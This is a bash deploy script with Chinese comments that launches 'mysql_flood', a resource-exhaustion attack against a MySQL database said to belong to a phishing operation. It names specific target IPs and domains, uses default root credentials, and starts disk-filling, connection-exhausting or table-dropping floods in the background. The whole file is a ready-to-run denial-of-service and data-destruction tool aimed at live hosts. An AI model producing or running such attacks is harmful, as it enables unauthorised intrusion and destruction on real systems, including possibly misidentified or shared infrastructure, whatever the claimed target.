#!/usr/bin/env bash
# ============================================================
#  mysql_flood 一键部署脚本
#  针对钓鱼基础设施 phishdb 的资源耗尽攻击
# ============================================================
# 用法:
#   ./deploy.sh [host] [mode] [threads] [rowsize]
#
#   参数默认值:
#     host    = 47.238.73.241   (ryzhe.com 真实IP, DoH解析)
#     mode    = disk            (disk|conn|drop|demo)
#     threads = 16
#     rowsize = 1048576         (1MB/行)
#
#   环境变量可覆盖: PORT MYSQL_USER MYSQL_PASS
#
#   候选真实IP (DoH 绕过 Clash fake-ip 解析结果):
#     47.238.73.241   ryzhe.com           (木马下载源, 阿里云国际, 最可能跑 phishdb)
#     154.19.252.12   xh-xiaohongshu.com.cn (钓鱼首页)
#     104.21.60.101 / 172.67.195.196        noah-ssh.com.cn (Cloudflare)
# ============================================================
set -uo pipefail

HOST="${1:-47.238.73.241}"
MODE="${2:-disk}"
THREADS="${3:-16}"
ROWSIZE="${4:-1048576}"
PORT="${PORT:-3306}"
MYSQL_USER="${MYSQL_USER:-root}"
MYSQL_PASS="${MYSQL_PASS:-root}"

echo "=============================================="
echo " mysql_flood 部署"
echo "   目标:   ${MYSQL_USER}:${MYSQL_PASS}@${HOST}:${PORT}"
echo "   模式:   ${MODE}"
echo "   线程:   ${THREADS}   行大小: ${ROWSIZE}"
echo "=============================================="

# 1. 环境检查
if ! command -v python3 >/dev/null 2>&1; then
    echo "[-] 未找到 python3, 请先安装"; exit 1
fi
echo "[+] python3: $(python3 --version 2>&1)"

# 2. 准备 venv 并安装 pymysql (兼容 Ubuntu PEP 668)
PY="python3"
if ! python3 -c "import pymysql" >/dev/null 2>&1; then
    echo "[*] 系统无 pymysql, 用 venv 安装..."
    if [ ! -d ".venv" ]; then
        python3 -m venv .venv || {
            echo "[-] venv 创建失败, 请: apt install -y python3-venv"; exit 1
        }
    fi
    PY=".venv/bin/python"
    if ! "$PY" -c "import pymysql" >/dev/null 2>&1; then
        .venv/bin/pip install -q pymysql || { echo "[-] pymysql 安装失败"; exit 1; }
    fi
fi
echo "[+] pymysql 就绪 ($PY)"

# 3. 先 demo 验证凭据 + 确认 phishdb
echo "[*] 验证连接 (demo 模式)..."
$PY mysql_flood.py --host "$HOST" --port "$PORT" --user "$MYSQL_USER" --pass "$MYSQL_PASS" --mode demo
RC=$?
if [ "$MODE" = "demo" ]; then
    echo "[*] demo 结束, 退出"; exit $RC
fi

# 4. 启动攻击 (后台 + unbuffered)
echo "[*] 启动 ${MODE} 模式 (后台)..."
nohup $PY -u mysql_flood.py \
    --host "$HOST" --port "$PORT" --user "$MYSQL_USER" --pass "$MYSQL_PASS" \
    --mode "$MODE" --threads "$THREADS" --rowsize "$ROWSIZE" \
    > mysql_flood.log 2>&1 &
PID=$!
echo "[+] 已启动 PID=${PID}"
echo "[*] 实时日志: tail -f mysql_flood.log"
echo "[*] 停止:     kill ${PID}"
